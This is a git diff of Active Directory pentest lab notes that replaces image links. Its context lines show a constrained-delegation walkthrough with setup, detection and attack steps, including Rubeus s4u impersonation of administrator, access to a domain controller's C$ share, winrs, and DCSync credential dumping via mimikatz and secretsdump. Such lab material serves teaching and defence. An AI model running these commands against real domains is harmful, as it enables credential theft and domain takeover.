@@ -501,39 +501,39 @@ lsadump::dcsync /domain:bank.local /user:DC01$
 
 1. Create a Domain Join Computer and go to Server Manager -> Tools -> Active Directory Users and Computers. Click on Users -> Right Click -> New -> User. We going to create one user name **"serviceuser"**
 
-![[Pasted image 20210812153441.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812153441.png)
 
 2. Complete all the details.
 
-![[Pasted image 20210812153555.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812153555.png)
 
 3. Go to View -> Enable Advanced Features.
 
-![[Pasted image 20210812153746.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812153746.png)
 
 4. Double Click on the serviceuser and go to **Attribute Editor**
 
-![[Pasted image 20210812153825.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812153825.png)
 
 5. Find **"servicePrincipalName"** and add the service name.
 
-![[Pasted image 20210812154014.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154014.png)
 
 6. Click apply and OK. We will see a new tab Delegation **(Close and double click on serviceuser again if not show)** . Tick on **"Trust this user for delegation to specified services only"** and **"Use any authentication protocol"**
 
-![[Pasted image 20210812154351.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154351.png)
 
 7. Then click Add. Then click on Users or Computers. Add our DC Computer or any computer that we want this **"serviceuser"** to delegate. Then click OK.
 
-![[Pasted image 20210812154639.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154639.png)
 
 8. Choose services such as **(HTTP, HOST, CIFS)** . Use CTRL to choose multiples.
 
-![[Pasted image 20210812154825.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154825.png)
 
 9. Click on Apply once finish.
 
-![[Pasted image 20210812154846.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812154846.png)
 
 ### Detect
 
@@ -622,11 +622,11 @@ accountexpires                 {9223372036854775807}
 userprincipalname              {serviceuser@bank.local}
 ```
 
-![[Pasted image 20210812155831.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812155831.png)
 
-![[Pasted image 20210812155856.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812155856.png)
 
-![[Pasted image 20210812160050.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812160050.png)
 
 ### Attack
 
@@ -663,7 +663,7 @@ userprincipalname              {serviceuser@bank.local}
 [*]       des_cbc_md5          : A8B93E8694C77FAE
 ```
 
-![[Pasted image 20210812160640.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812160640.png)
 
 - Use **Rubeus.exe** to perform s4u delegation and request TGT for user that we want to impersonate. 
 
@@ -680,7 +680,7 @@ klist
 klist purge
 ```
 
-![[Pasted image 20210812162220.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812162220.png)
 
 - We can try list **DC01** with this command now.
 
@@ -689,7 +689,7 @@ klist purge
 ls \\dc01\c$
 ```
 
-![[Pasted image 20210812162307.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812162307.png)
 
 - We can try **winrs** but take notes that it only work once. So everytime we want to run winrs, we need to re run the Rubeus again and request TGT.
 
@@ -698,7 +698,7 @@ ls \\dc01\c$
 winrs -r:DC01 whoami
 ```
 
-![[Pasted image 20210812162541.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812162541.png)
 
 - We can also try to mount C$ of DC01 to another drive in our machine.
 
@@ -707,7 +707,7 @@ winrs -r:DC01 whoami
 net use Z: \\dc01\c$
 ```
 
-![[Pasted image 20210812162821.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812162821.png)
 
 - We can also try to use **getST** to get the impersonate user ccache file. Then use it to perform dcsync.
 
@@ -718,11 +718,11 @@ export KRB5CCNAME=Administrator.ccache
 secretsdump.py -k DC01.bank.local -just-dc
 ```
 
-![[Pasted image 20210812164956.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812164956.png)
 
 - Take notes to add **"DC01.bank.local"** and **"bank.local"** in /etc/hosts
 
-![[Pasted image 20210811235232.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811235232.png)
 
 
 **2. Has session without knowing Plaintext/NTLM**
@@ -768,7 +768,7 @@ secretsdump.py -k DC01.bank.local -just-dc
 .\Rubeus.exe s4u /user:serviceuser /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:"cifs/DC01" /altservice:cifs,http,host /ptt
 ```
 
-![[Pasted image 20210812163800.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812163800.png)
 
 - Then we can try the same thing like the first scenario. For example we can try list **DC01** with this command now.
 
@@ -777,7 +777,7 @@ secretsdump.py -k DC01.bank.local -just-dc
 ls \\DC01\c$
 ```
 
-![[Pasted image 20210812163943.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210812163943.png)
 
 ### References
 
